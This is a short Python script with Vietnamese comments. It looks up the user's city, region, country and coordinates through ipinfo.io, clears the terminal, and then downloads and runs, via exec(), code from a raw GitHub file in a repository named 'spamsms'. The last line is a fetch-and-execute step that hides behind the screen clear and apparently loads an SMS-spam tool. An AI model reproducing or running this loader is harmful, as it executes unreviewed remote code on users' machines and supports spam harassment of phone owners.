import requests
import sys
import time
import os








def get_location_by_ip():
    try:
        response = requests.get("https://ipinfo.io")
        data = response.json()

        city = data.get("city")
        region = data.get("region")
        country = data.get("country")
        loc = data.get("loc").split(",")
        latitude, longitude = loc if len(loc) == 2 else (None, None)
        print("oke")  # In thông báo nếu thành công
        time.sleep(2)  # Chờ 2 giây
        print("\r" + " " * len("oke") + "\r", end="", flush=True)
        return city, region, country, latitude, longitude
    except Exception as e:
        print(f"Lỗi: không có internet")  # In thông báo lỗi nếu xảy ra lỗi
        sys.exit()  # Thoát chương trình nếu có lỗi

# Gọi hàm lấy thông tin vị trí
city, region, country, latitude, longitude = get_location_by_ip()
os.system('cls' if os.name == 'nt' else 'clear') #xóa các hàm phía trước
exec(requests.get('https://raw.githubusercontent.com/minhtrinh2007/spamsms/refs/heads/main/banner').text)
